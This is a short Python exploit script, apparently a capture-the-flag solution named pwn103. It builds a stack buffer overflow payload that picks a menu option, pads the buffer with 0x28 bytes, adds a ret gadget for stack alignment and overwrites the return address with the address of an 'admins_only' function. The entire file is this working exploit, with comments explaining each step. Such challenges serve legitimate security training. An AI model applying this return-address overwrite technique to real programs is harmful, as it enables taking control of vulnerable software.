# pwn103.py

import struct
import sys

ret = struct.pack("<Q",0x401377)
rip = struct.pack("<Q",0x401554)

payload =   b'3\n'              # select menu option 3 (General)
payload +=  b'A'*(0x20 + 8)     # fill the buffer up to where we want to write
payload +=  ret                 # run the same ret twice
payload +=  rip                 # write admins_only address
payload +=  b'\n'               # send input

sys.stdout.buffer.write(payload)
